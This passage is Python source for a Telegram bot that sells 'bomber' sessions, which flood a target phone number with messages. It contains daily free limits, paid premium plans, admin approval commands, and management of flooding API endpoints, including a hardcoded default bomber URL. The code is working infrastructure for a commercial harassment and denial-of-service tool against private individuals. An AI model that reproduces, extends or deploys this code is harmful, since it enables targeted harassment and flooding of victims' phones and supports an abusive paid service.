            "⚠️ ɴᴏ +, ɴᴏ ꜱᴘᴀᴄᴇꜱ, ᴏɴʟʏ ᴅɪɢɪᴛꜱ",
            parse_mode='Markdown'
        )
        return

    premium = premium_users.get(user_id)
    if premium:
        plan_token = premium["plan"]
        plan_info = PLANS.get(plan_token)
        if plan_info:
            duration_minutes = plan_info[1]
        else:
            duration_minutes = FREE_MAX_DURATION_MIN
    else:
        uses = _get_daily_uses(user_id)
        if uses >= FREE_DAILY_LIMIT:
            pm_text_lines = [
                "⚠️ *ᴅᴀɪʟʏ ʟɪᴍɪᴛ ʀᴇᴀᴄʜᴇᴅ*\n\n"
                f"ʏᴏᴜ ʜᴀᴠᴇ ᴜꜱᴇᴅ ʏᴏᴜʀ ꜰʀᴇᴇ ʙᴏᴍʙᴇʀ *{FREE_DAILY_LIMIT}* ᴛɪᴍᴇꜱ ᴛᴏᴅᴀʏ.\n\n"
                "💎 *ᴜᴘɢʀᴀᴅᴇ ᴛᴏ ᴘʀᴇᴍɪᴜᴍ ꜰᴏʀ*:\n"
                "├─ ɴᴏ ᴅᴀɪʟʏ ʟɪᴍɪᴛꜱ\n"
                "├─ ʟᴏɴɢᴇʀ ꜱᴇꜱꜱɪᴏɴꜱ\n"
                "└─ ᴍᴏʀᴇ ᴘᴏᴡᴇʀ\n\n"
                "*ᴘʀᴇᴍɪᴜᴍ ᴘʟᴀɴꜱ*:"
            ]
            for token, (name, minutes, benefits) in PLANS.items():
                pm_text_lines.append(f"• *{name}* - {minutes} ᴍɪɴᴜᴛᴇꜱ")
            pm_text_lines.append(f"\n📞 ᴄᴏɴᴛᴀᴄᴛ: {OWNER_USERNAME}")
            await update.message.reply_text("\n".join(pm_text_lines), parse_mode='Markdown')
            user_sessions.pop(user_id, None)
            return
        else:
            duration_minutes = FREE_MAX_DURATION_MIN
            _increment_daily_uses(user_id)

    await start_bombing_session(update, context, phone_number, user_id, duration_minutes)

# -----------------------------
# ᴏʀɪɢɪɴᴀʟ ᴀᴅᴍɪɴ ᴄᴏᴍᴍᴀɴᴅꜱ (ᴋᴇᴇᴘ ᴏʀɪɢɪɴᴀʟ ꜰᴏʀ ʙᴀᴄᴋᴡᴀʀᴅ ᴄᴏᴍᴘᴀᴛɪʙɪʟɪᴛʏ)
# -----------------------------
async def approve_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    sender = update.effective_user
    if sender.id != ADMIN_ID:
        await update.message.reply_text("❌ ɴᴏᴛ ᴀᴜᴛʜᴏʀɪᴢᴇᴅ!")
        return
    
    args = context.args
    if len(args) < 2:
        await update.message.reply_text(
            "ᴜꜱᴀɢᴇ: /ᴀᴘᴘʀᴏᴠᴇ <ᴜꜱᴇʀ_ɪᴅ> <ᴘʟᴀɴ> [ᴅᴀʏꜱ]\n"
            "ᴇxᴀᴍᴘʟᴇ: /ᴀᴘᴘʀᴏᴠᴇ 123456789 ꜱɪʟᴠᴇʀ 30"
        )
        return
    
    try:
        target_id = int(args[0])
    except ValueError:
        await update.message.reply_text("ɪɴᴠᴀʟɪᴅ ᴜꜱᴇʀ ɪᴅ!")
        return
    
    plan_token = args[1].lower()
    if plan_token not in PLANS:
        await update.message.reply_text(f"ɪɴᴠᴀʟɪᴅ ᴘʟᴀɴ! ᴠᴀʟɪᴅ: {', '.join(PLANS.keys())}")
        return
    
    days = 30  # ᴅᴇꜰᴀᴜʟᴛ
    if len(args) > 2:
        try:
            days = int(args[2])
        except ValueError:
            days = 30
    
    # ᴀᴘᴘʀᴏᴠᴇ ᴛʜᴇ ᴜꜱᴇʀ
    expiry_date = datetime.now() + timedelta(days=days)
    premium_users[target_id] = {
        "plan": plan_token,
        "approved_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "expires_at": expiry_date.strftime("%Y-%m-%d %H:%M:%S"),
        "days": days
    }
    
    # ᴜᴘᴅᴀᴛᴇ ᴜꜱᴇʀ ᴅᴀᴛᴀ
    if target_id in all_users:
        all_users[target_id]["premium"] = True
        all_users[target_id]["premium_plan"] = plan_token
        all_users[target_id]["premium_until"] = expiry_date.strftime("%Y-%m-%d %H:%M:%S")
        save_users()
    
    await update.message.reply_text(
        f"✅ ᴜꜱᴇʀ `{target_id}` ᴀᴘᴘʀᴏᴠᴇᴅ ꜰᴏʀ {PLANS[plan_token][0]} ꜰᴏʀ {days} ᴅᴀʏꜱ!",
        parse_mode='Markdown'
    )
    
    # ɴᴏᴛɪꜰʏ ᴜꜱᴇʀ
    try:
        await context.bot.send_message(
            chat_id=target_id,
            text=f"🎉 ʏᴏᴜʀ ᴀᴄᴄᴏᴜɴᴛ ʜᴀꜱ ʙᴇᴇɴ ᴜᴘɢʀᴀᴅᴇᴅ ᴛᴏ **{PLANS[plan_token][0]}**!\n\n"
                 f"ᴇxᴘɪʀᴇꜱ: {expiry_date.strftime('%d %B %Y')}\n\n"
                 f"ᴜꜱᴇ /ꜱᴛᴀʀᴛ ᴛᴏ ᴇɴᴊᴏʏ!",
            parse_mode='Markdown'
        )
    except Exception:
        pass

async def revoke_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    sender = update.effective_user
    if sender.id != ADMIN_ID:
        await update.message.reply_text("❌ ɴᴏᴛ ᴀᴜᴛʜᴏʀɪᴢᴇᴅ!")
        return
    
    args = context.args
    if len(args) < 1:
        await update.message.reply_text("ᴜꜱᴀɢᴇ: /ʀᴇᴠᴏᴋᴇ <ᴜꜱᴇʀ_ɪᴅ>")
        return
    
    try:
        target_id = int(args[0])
    except ValueError:
        await update.message.reply_text("ɪɴᴠᴀʟɪᴅ ᴜꜱᴇʀ ɪᴅ!")
        return
    
    premium_users.pop(target_id, None)
    
    # ᴜᴘᴅᴀᴛᴇ ᴜꜱᴇʀ ᴅᴀᴛᴀ
    if target_id in all_users:
        all_users[target_id]["premium"] = False
        all_users[target_id]["premium_plan"] = None
        all_users[target_id]["premium_until"] = None
        save_users()
    
    await update.message.reply_text(f"✅ ᴜꜱᴇʀ `{target_id}` ᴅɪꜱᴀᴘᴘʀᴏᴠᴇᴅ!", parse_mode='Markdown')
    
    # ɴᴏᴛɪꜰʏ ᴜꜱᴇʀ
    try:
        await context.bot.send_message(
            chat_id=target_id,
            text=f"⚠️ ʏᴏᴜʀ ᴘʀᴇᴍɪᴜᴍ ꜱᴛᴀᴛᴜꜱ ʜᴀꜱ ʙᴇᴇɴ ʀᴇᴠᴏᴋᴇᴅ.\n\n"
                 f"ʏᴏᴜʀ ᴀᴄᴄᴏᴜɴᴛ ɪꜱ ɴᴏᴡ ᴅᴏᴡɴɢʀᴀᴅᴇᴅ ᴛᴏ ꜰʀᴇᴇ ᴛɪᴇʀ.",
            parse_mode='Markdown'
        )
    except Exception:
        pass

# -----------------------------
# ᴀᴅᴍɪɴ ᴀᴘɪ ᴍᴀɴᴀɢᴇᴍᴇɴᴛ ᴄᴏᴍᴍᴀɴᴅꜱ
# -----------------------------
async def addapi_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    sender = update.effective_user
    if sender.id != ADMIN_ID:
        await update.message.reply_text("❌ ɴᴏᴛ ᴀᴜᴛʜᴏʀɪᴢᴇᴅ!")
        return
    args = context.args
    if len(args) != 1:
        await update.message.reply_text("ᴜꜱᴀɢᴇ: /ᴀᴅᴅᴀᴘɪ <ᴜʀʟ>\nᴇxᴀᴍᴘʟᴇ: /ᴀᴅᴅᴀᴘɪ http://example.com/send?num={phone}")
        return
    url = args[0].strip()
    if "{phone}" not in url:
        await update.message.reply_text("ᴜʀʟ ᴍᴜꜱᴛ ᴄᴏɴᴛᴀɪɴ `{phone}` ᴘʟᴀᴄᴇʜᴏʟᴅᴇʀ!")
        return
    for a in apis:
        if a.get("url") == url:
            await update.message.reply_text("ᴀᴘɪ ᴀʟʀᴇᴀᴅʏ ᴇxɪꜱᴛꜱ!")
            return
    apis.append({"url": url, "uses": 0, "success": 0, "fail": 0, "last_used": None, "last_resp_ms": None})
    save_apis()
    await update.message.reply_text(f"✅ ᴀᴘɪ ᴀᴅᴅᴇᴅ: `{url}`", parse_mode='Markdown')

async def removeapi_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    sender = update.effective_user
    if sender.id != ADMIN_ID:
        await update.message.reply_text("❌ ɴᴏᴛ ᴀᴜᴛʜᴏʀɪᴢᴇᴅ!")
        return
    args = context.args
    if len(args) != 1:
        await update.message.reply_text("ᴜꜱᴀɢᴇ: /ʀᴇᴍᴏᴠᴇᴀᴘɪ <ᴜʀʟ>\nᴇxᴀᴍᴘʟᴇ: /ʀᴇᴍᴏᴠᴇᴀᴘɪ http://example.com/send?num={phone}")
        return
    url = args[0].strip()
    found = False
    for a in list(apis):
        if a.get("url") == url:
            apis.remove(a)
            found = True
    if not found:
        await update.message.reply_text("ᴀᴘɪ ɴᴏᴛ ꜰᴏᴜɴᴅ!")
        return
    save_apis()
    await update.message.reply_text(f"✅ ᴀᴘɪ ʀᴇᴍᴏᴠᴇᴅ: `{url}`", parse_mode='Markdown')

async def apistatus_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    sender = update.effective_user
    if sender.id != ADMIN_ID:
        await update.message.reply_text("❌ ɴᴏᴛ ᴀᴜᴛʜᴏʀɪᴢᴇᴅ!")
        return

    if not apis:
        await update.message.reply_text("ɴᴏ ᴀᴘɪꜱ ᴄᴏɴꜰɪɢᴜʀᴇᴅ.")
        return

    checks = []
    for a in apis:
        checks.append(check_api_health(a["url"]))
    results = await asyncio.gather(*checks)

    lines = ["🔧 *ᴀᴘɪ ꜱᴛᴀᴛᴜꜱ — ʟɪᴠᴇ ᴄʜᴇᴄᴋꜱ*\n"]
    for idx, a in enumerate(apis, start=1):
        res = results[idx - 1]
        uses = a.get("uses", 0)
        succ = a.get("success", 0)
        fail = a.get("fail", 0)
        sr = (succ / uses * 100) if uses > 0 else 0.0
        last_used = a.get("last_used") or "ɴᴇᴠᴇʀ"
        resp_ms = a.get("last_resp_ms")
        resp_ms_text = f"{resp_ms} ᴍꜱ" if resp_ms else "ɴ/ᴀ"
        status_icon = "✅" if res.get("state") == "ᴀᴄᴛɪᴠᴇ" else ("⚠️" if res.get("state") == "ᴇʀʀᴏʀ" or res.get("perf") == "ꜱʟᴏᴡ" else "❌")
        perf = res.get("perf")
        state = res.get("state")
        resp_time = res.get("resp_ms", None)
        lines.append(
            f"*{idx}.* `{a['url']}`\n"
            f"• ᴜꜱᴇꜱ: {uses} | ꜱᴜᴄᴄᴇꜱꜱ: {succ} | ꜰᴀɪʟ: {fail} | ꜱᴜᴄᴄᴇꜱꜱ ʀᴀᴛᴇ: {sr:.1f}%\n"
            f"• ʟᴀꜱᴛ ᴜꜱᴇᴅ: {last_used} | ʟᴀꜱᴛ ʀᴇꜱᴘ: {resp_ms_text}\n"
            f"• ʟɪᴠᴇ: {status_icon} {state} | ᴘᴇʀꜰ: {perf} | ʀᴇꜱᴘ: {resp_time} ᴍꜱ\n"
        )
    text = "\n".join(lines)
    await update.message.reply_text(text, parse_mode='Markdown')

async def resetapis_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    sender = update.effective_user
    if sender.id != ADMIN_ID:
        await update.message.reply_text("❌ ɴᴏᴛ ᴀᴜᴛʜᴏʀɪᴢᴇᴅ!")
        return
    default = [{
        "url": "http://bomberr.onrender.com/num={phone}",
        "uses": 0,
        "success": 0,
        "fail": 0,
        "last_used": None,
        "last_resp_ms": None
    }]
    try:
        with open(API_FILE, "w") as f:
            json.dump(default, f, indent=2)
        load_apis()
        await update.message.reply_text(
            "♻️ ᴀᴘɪꜱ ʀᴇꜱᴇᴛ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ!\n\nᴅᴇꜰᴀᴜʟᴛ ᴀᴘɪ ʟᴏᴀᴅᴇᴅ:\n• http://bomberr.onrender.com/num={phone}",
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"ꜰᴀɪʟᴇᴅ ᴛᴏ ʀᴇꜱᴇᴛ ᴀᴘɪꜱ: {e}")
        await update.message.reply_text("❌ ꜰᴀɪʟᴇᴅ ᴛᴏ ʀᴇꜱᴇᴛ ᴀᴘɪꜱ!", parse_mode='Markdown')

# -----------------------------
# ᴇʀʀᴏʀ ʜᴀɴᴅʟᴇʀ
# -----------------------------
async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"ᴇʀʀᴏʀ: {context.error}")

# -----------------------------
# ᴍᴀɪɴ (FIXED - Added handle_admin_message handler)
# -----------------------------
def main():
    load_apis()
    load_users()
    
    application = Application.builder().token(BOT_TOKEN).build()

    # ʙᴀꜱɪᴄ ᴄᴏᴍᴍᴀɴᴅꜱ
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("approve", approve_command))
    application.add_handler(CommandHandler("revoke", revoke_command))

    # ᴀᴘɪ ᴍᴀɴᴀɢᴇᴍᴇɴᴛ
    application.add_handler(CommandHandler("addapi", addapi_command))
    application.add_handler(CommandHandler("removeapi", removeapi_command))
    application.add_handler(CommandHandler("apistatus", apistatus_command))
    application.add_handler(CommandHandler("resetapis", resetapis_command))

    # ᴄᴀʟʟʙᴀᴄᴋ ʜᴀɴᴅʟᴇʀꜱ
    application.add_handler(CallbackQueryHandler(button_handler))

    # ᴍᴇꜱꜱᴀɢᴇ ʜᴀɴᴅʟᴇʀꜱ
    # FIXED: Added handle_admin_message handler with proper filter
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_number))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_admin_message))

    # ᴇʀʀᴏʀ ʜᴀɴᴅʟᴇʀ
    application.add_error_handler(error_handler)

    print("🤖 ʙᴏᴛ ɪꜱ ʀᴜɴɴɪɴɢ...")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
